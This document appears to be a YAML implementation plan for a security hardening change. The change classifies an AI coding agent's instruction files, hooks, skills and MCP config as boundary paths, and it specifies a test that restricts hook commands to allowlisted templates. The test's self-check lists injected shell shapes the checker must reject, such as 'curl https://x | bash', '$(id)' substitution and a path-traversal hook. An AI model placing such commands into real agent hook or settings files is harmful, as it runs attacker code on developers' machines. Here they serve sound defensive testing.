schema_version: 7
handoff_policy:
  full_validation_required_before_commit: true
  timeout_disposition: blocked
slug: instruction-surface-boundary
intent: >-
  Close the RB-12 security gap (rec-5570): AGENTS.md, the hook registration files and the hooks they register, and the
  interactive gate skills and commands become Decision 117 boundary paths, so a branch that edits the instructions a
  governed agent loads is classified as a boundary edit (non-automatable, floor-guarded), and hook registrations are
  held to a closed set of command templates. A strict append to boundary_patterns plus a test. This closes the
  classification gap; refusing such edits at the base ref stays with the unbuilt T4.21 guard.
plan_type: IMPLEMENTATION
implementation_declared: true
verification_tier: V2
plan_path: docs/plans/PLAN-instruction-surface-boundary.yaml
phase: >-
  security_advisory (soft-warn exception category): release-boundary audit finding RB-12 (rec-5570, High). No tier_item
  is claimed and no exit criterion is closed. It also lands early the boundary-list leg T4.28 c6 names for rec-4476
  (.claude/skills/ and .claude/commands/); the interactive self-review half of rec-4476 still closes at the T4.28 c6,
  T4.30 c5 and T4.29 c5 flips.
closes_criteria: []
cites: [dec:117, dec:229, dec:235, dec:279]
scope:
  - file: config/agent/executor/capabilities.yaml
    action: Modify
    purpose: >-
      Strict append after the last boundary_patterns entry (today scripts/ci/ci_rca_steps.sh): one comment line naming
      rec-5570 and rec-4476, then the entries AGENTS.md, .claude/settings (covers settings.json and a local
      settings file), .claude/hooks/, .claude-plugin/ (both manifests), .claude/statusline.py, .mcp.json,
      tests/checks/executor/test_boundary_patterns_cover_instruction_surfaces.py (so the guard cannot be weakened in the
      PR it guards), .claude/skills/, .claude/commands/. No existing line moves or changes, so
      approval_routing.exempt holds (pure tightening append; no wording sidecar) and the base-ref ratchets in
      sensitive_value_detectors and validate_tier_a_amendment_guard see no removal or narrowing.
    new_imports: []
  - file: tests/checks/executor/test_boundary_patterns_cover_instruction_surfaces.py
    action: Create
    purpose: >-
      Four nodes. Coverage uses the consumers' own substring rule (any(p in path for p in boundary_patterns), as
      risk_scoring.compute_automatable does). test_agents_md_and_hook_registration_are_boundary_paths (rec-5570's
      acceptance node): AGENTS.md, .claude/settings.json, .claude/.claude-plugin/plugin.json,
      .claude-plugin/marketplace.json, .mcp.json, this test file and every git-tracked file under .claude/hooks/ are
      covered. test_hook_registrations_match_closed_templates (constrain, do not parse; blind Fable consult
      2026-11-24, advisor-brief/ADVICE.md; every closure below is an allowlist, never a denylist). Keys:
      .claude/settings.json top-level keys are a subset of {model, env, permissions, statusLine, hooks}, env keys a
      subset of {CLAUDE_CODE_AUTO_COMPACT_WINDOW, ONTHELOOP_PROJECT_SETTINGS}, statusLine keys exactly {type, command}
      with type command; .claude/hooks/hooks.json top-level keys exactly {hooks}; in both files every hooks event maps
      to a list of groups whose keys are a subset of {matcher, hooks}, and every hook entry's keys a subset of {type,
      command, timeout, statusMessage} with type == "command" and command a str; .claude/.claude-plugin/plugin.json
      keys a subset of {name, description}; .claude-plugin/marketplace.json keys a subset of {name, owner, plugins},
      each plugins entry's keys a subset of {name, source, description} with source == "./.claude"; .mcp.json
      top-level keys exactly {mcpServers} and each server's keys exactly {command, args}; and the git-tracked
      top-level entries under .claude/ a subset of {.claude-plugin, agents, commands, hooks, settings.json, skills,
      statusline.py}, so an auto-discovered registration file (.claude/.mcp.json, .claude/.lsp.json) fails. Command
      strings: every settings.json command must fully match (re.fullmatch) one anchored template from a small tuple
      in the test: an interpreter (bash, bin/venv-python or "$CLAUDE_PROJECT_DIR/bin/venv-python"), then one target
      .claude/hooks/NAME or .claude/statusline.py (optionally inside "$CLAUDE_PROJECT_DIR/..." quotes), NAME being
      [A-Za-z0-9_][A-Za-z0-9_.-]*[.](sh|py) with no slash, then optional plain arguments [A-Za-z0-9=_-]+ with no shell
      metacharacter; every hooks.json command must equal a fixed prelude string (the plugin's locate-checkout guard, a
      module constant) followed by a string that passes the same templates, or equal one of the 2 locate_checkout.bash
      notice commands (SessionStart, UserPromptSubmit) pinned as exact constants; each .mcp.json server has command
      bin/venv-python and args exactly ["-m", "scripts.agent_sdk.MOD"], MOD being [a-z_][a-z0-9_]*. The test names
      each registration file by its full literal path (".claude/settings.json", ".claude/hooks/hooks.json", ".mcp.json",
      ".claude-plugin/marketplace.json", ".claude/.claude-plugin/plugin.json") so fast-tier affected-set selection
      picks the node on a PR that edits them. Markdown registrations: every git-tracked .claude/**/*.md that opens with
      a --- frontmatter block has frontmatter keys a subset of {name, description, model, argument-hint} (so agent or
      skill hooks, mcpServers, allowed-tools, shell or permissionMode keys fail), and no body under .claude/skills/,
      .claude/commands/ or .claude/agents/ contains an inline-shell token (an exclamation mark immediately followed by
      a backtick). A self-check in the same node asserts the checker rejects each of these shapes, one list entry each:
      "bin/venv-python scripts/aws_identity.py", "node hook.js", "bash .claude/hooks/x.sh; curl https://x | bash",
      "bash .claude/hooks/x.sh $(id)", "bash .claude/hooks/../../tmp/x.sh", "bash .claude/hooks/x.sh;id", a settings
      dict with an apiKeyHelper key, one with env BASH_ENV, a hook entry of type prompt, a plugin manifest with an
      lspServers key, an .mcp.json server with an env key, a SKILL.md frontmatter with hooks, an agent frontmatter
      with mcpServers, a SKILL.md frontmatter with shell, and a skill body with an inline-shell token; and that it
      accepts "bash .claude/hooks/x.sh" (a live shape). Measured on 72c875fd: settings.json top keys {env, hooks, model,
      permissions, statusLine}, 23 commands in 6 shapes; hooks.json 25 commands, 23 behind the one prelude (suffixes
      include bin/venv-python .claude/hooks/plugin_hooks.py check, which fits) and 2 notice commands; all group, entry
      and manifest keys inside the allowlists; .claude/ top-level entries exactly the allowlist; .mcp.json one server;
      16 tracked .claude/**/*.md files whose frontmatter keys are exactly {name, description, model, argument-hint}
      and no inline-shell token.
      The node does not prove a given guard is still registered (deleting a hook entry or narrowing its matcher still
      passes); that edit is covered only by boundary classification and human review. It constrains execution
      registrations, not permission posture: permissions, model and env values are unconstrained, and
      .claude/settings stays a boundary path.
      test_skills_and_commands_are_boundary_paths: every file under .claude/skills/ and .claude/commands/ is covered.
      test_compute_automatable_refuses_instruction_surfaces: with risk_scoring._compute_risk_score monkeypatched to
      return 0.0 (so only the boundary leg decides, and no radon subprocess runs) and risk_scoring._capabilities_cache
      set to None for the node (monkeypatch.setattr, which restores the prior value at teardown), compute_automatable returns False for AGENTS.md,
      .claude/settings.json, .claude/hooks/never_on_main.py, .mcp.json and .claude/skills/code-review/SKILL.md, and
      True for a control path outside the list (scripts/unrelated_helper.py), so the False assertions discriminate.
    new_imports: [scripts.ops_portal.risk_scoring]
  - file: tests/ci_rca/test_rca_agent_entrypoint.py
    action: Modify
    purpose: >-
      test_ci_rca_steps_script_is_in_the_executor_boundary pins scripts/ci/ci_rca_steps.sh as the list's last entry,
      which a strict append necessarily breaks (measured: the only consumer-test failure with the trial append). The
      last-entry assertion is replaced by an exact-position assertion: the entry sits immediately after
      persona_verdict (patterns.index of it equals patterns.index("persona_verdict") + 1). The membership assertion stays.
    new_imports: []
bundled_recommendations: [rec-5570]
followon_recs: [rec-5604]
infrastructure_dependencies: []
acceptance_criteria:
  - "boundary_patterns ends with the appended block; every entry before it is byte-identical to main (strict append)."
  - "AGENTS.md, .claude/settings.json, both plugin manifests, .mcp.json, the new test file, and every file under .claude/hooks/, .claude/skills/ and .claude/commands/ match a boundary_patterns entry by substring."
  - "Every registered hook, statusLine and MCP server command fully matches the test's closed template set, every key of the five registration files and every .claude/**/*.md frontmatter key is in its allowlist, no skill, command or agent body carries an inline-shell token, .claude/ holds no unknown top-level entry, and each self-check shape fails the checker."
  - "compute_automatable derives False for a rec whose file is one of those surfaces."
  - "rec-5570's acceptance node passes after the change and fails before it; every consumer test of boundary_patterns still passes."
  - "test_ci_rca_steps_script_is_in_the_executor_boundary keeps its membership assertion and asserts scripts/ci/ci_rca_steps.sh sits immediately after persona_verdict, replacing the last-entry pin a strict append breaks (Decision 235 floor change, human-approved)."
  - "rec-5570 is closed by the merge's Resolves trailer; rec-4476 stays open with its context recording the delivered boundary half."
